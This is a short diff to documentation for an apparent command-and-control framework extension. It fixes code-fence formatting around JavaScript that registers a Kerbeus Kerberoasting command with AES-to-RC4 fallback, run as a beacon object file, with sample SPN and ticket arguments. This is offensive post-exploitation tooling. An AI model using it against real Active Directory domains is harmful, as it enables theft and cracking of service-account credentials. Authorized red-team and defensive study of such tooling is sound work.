@@ -69,7 +69,7 @@ To include in `make`:
 Add the following command block to `kerbeus.axs` after the existing
 `_cmd_kerberoasting` block:
 
-​```javascript
+```javascript
 let _cmd_kerberoasting_aes = ax.create_command("kerberoasting-aes-fallback", "Perform Kerberoasting with AES256→AES128→RC4 etype negotiation", "kerbeus kerberoasting-aes-fallback /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...");
 _cmd_kerberoasting_aes.addArgString("params", true, "Args: /spn:SPN /ticket:BASE64 [/dc:DC] [/domain:DOMAIN]\n                              /spn:SPN /nopreauth:USER [/dc:DC] [/domain:DOMAIN]");
 _cmd_kerberoasting_aes.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
@@ -80,7 +80,7 @@ _cmd_kerberoasting_aes.setPreHook(function (id, cmdline, parsed_json, ...parsed_
 
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus KERBEROASTING-AES-FALLBACK");
 });
-​```
+```
 
 Then register it in `addSubCommands`:
 
